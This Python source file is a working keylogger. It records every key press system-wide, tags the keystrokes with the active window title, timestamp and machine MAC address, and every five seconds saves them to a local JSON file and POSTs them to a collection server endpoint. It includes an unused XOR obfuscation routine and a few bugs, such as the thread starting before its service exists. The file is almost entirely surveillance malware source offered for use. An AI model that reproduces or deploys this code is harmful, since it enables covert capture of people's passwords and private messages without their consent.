import os
import json
import keyboard
import pygetwindow as pw
from datetime import datetime
from abc import ABC, abstractmethod
import time
import threading
import uuid
import requests


class KeyLoggerService:

    def __init__(self):
        self.data = {}
        self._get_key_word()

    def _get_key_word(self):
        def callback(key):
            active_window = self._get_window()
            if active_window not in  self.data:
                self.data[active_window] = {}
            current_time = self._get_time()
            if current_time not in  self.data[active_window]:
                self.data[active_window][current_time] = ""
            self.data[active_window][current_time] += key.name

        keyboard.on_press(callback)

    def _get_window(self):
        try:
            return pw.getActiveWindow().title
        except:
            return "Undone window"

    def _get_time(self):

        return datetime.strftime(datetime.now(),"%Y-%m-%d %H:%M")

    def get_data(self):
        data = self.data
        mac_address = hex(uuid.getnode())[2:]
        new_data = {"mac": mac_address, "data": data}
        self.data = {}
        return new_data


class Writer(ABC):
    def __init__(self):
         pass

    @abstractmethod
    def write(self,data):
        pass


class FileWriter(Writer):

    def write(self,data):
        try:
            with open("DB.json","r") as file:
                original_data = json.load(file)
        except:
            original_data = {}

        original_data.update(data)
        with open("DB.json","w") as file:
            json.dump(original_data, file, indent=4)


class NetworkWriter(Writer):
    def write(self,data):
        response = requests.post("http://127.0.0.1:5000/save_data", json= data)


class Encryptor:

    def __init__(self):
        self.crypto_key = "g"
        self.mode = 1

    def _xor_help(self,value: str):
        array_xor = "".join([chr(ord(self.crypto_key) ^ ord(i) + (65 * self.mode)) for i in value])
        return array_xor

    def xor(self,data: dict):
        encrypted_data = {}
        for key_window,value in data["data"].items():
            new_window = self._xor_help(key_window,)
            encrypted_data[new_window] = {}
            for key_date,value_str in value.items():
                new_date = self._xor_help(key_date,)
                new_str = self._xor_help(value_str,)
                encrypted_data[new_window][new_date] = new_str
        return encrypted_data

    def _decryptor_xor(self,data):
        self.mode = -1
        decrypted_data = self.xor(data)
        self.mode = 1
        return  decrypted_data


class KeyLoggerManager:

    def __init__(self):
        self.key_logger_thread = threading.Thread(target=self._get_data_from_key_logger)
        self.key_logger_thread.start()
        self.keylogger_service =KeyLoggerService()
        self.file_writer = FileWriter()
        self.network_writer = NetworkWriter()
        self.encryptor = Encryptor()
        self.data = None

    def _get_data_from_key_logger(self):
        while True:
            time.sleep(5)
            data = self.keylogger_service.get_data()
            encrypt_data = self.encryptor.xor(data)
            print(data)
            self.file_writer.write(data)
            self.network_writer.write(data)

    def exit(self):
        self.key_logger_thread.join()

key = KeyLoggerManager()


